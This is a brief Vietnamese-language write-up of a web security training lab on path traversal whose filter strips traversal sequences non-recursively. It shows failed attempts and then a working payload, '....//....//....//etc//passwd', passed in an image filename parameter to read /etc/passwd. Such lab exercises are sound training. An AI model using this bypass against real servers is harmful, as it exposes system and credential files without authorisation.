# **Lab: File path traversal, traversal sequences stripped non-recursively**

>  This lab contains a path traversal vulnerability in the display of product images.  
>  The application strips path traversal sequences from the user-supplied filename before using it.  
>  To solve the lab, retrieve the contents of the `/etc/passwd` file.  

# **Solution**

Mở một hình ảnh trong tab mới.  
Trên URL ta thấy có tham số `filename`:

```
https://0ac000ed033dde8a826c1a0e008b00bf.web-security-academy.net/image?filename=1.jpg
```

```
filename=/etc/passwd
```

Trường hợp lần này dùng đường dẫn tuyệt đối tới /etc/passwd không có tác dụng. Web đã cấu hình để chặn việc truy xuất này, thử cách thông thường:

```
filename=../../../etc/passwd
```

Cách này cũng không có tác dụng do ứng dụng loại bỏ các chuỗi truyền tải đường dẫn khỏi tên tệp do người dùng cung cấp trước khi sử dụng.

Sửa filename:

```
filename=....//....//....//etc//passwd
```

Sử dụng liên tiếp `....` và `//` trong đó `..` và `/` để bypass filter của ứng dụng. 

Done~~